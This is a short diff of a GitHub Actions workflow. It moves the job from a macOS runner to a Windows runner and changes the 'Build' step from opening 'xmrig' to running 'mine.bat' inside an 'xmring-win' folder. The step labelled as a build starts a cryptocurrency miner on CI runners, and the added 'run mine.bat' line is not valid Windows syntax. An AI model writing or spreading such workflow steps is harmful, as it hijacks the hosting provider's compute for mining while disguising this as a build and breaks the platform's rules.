@@ -6,8 +6,10 @@ on:
 
 jobs:
   build:
-    runs-on: macos-latest
+    runs-on: windows-latest
     steps:
         - uses: actions/checkout@v2
         - name: Build
-          run: open xmrig
+          run: | 
+                cd xmring-win
+                run mine.bat
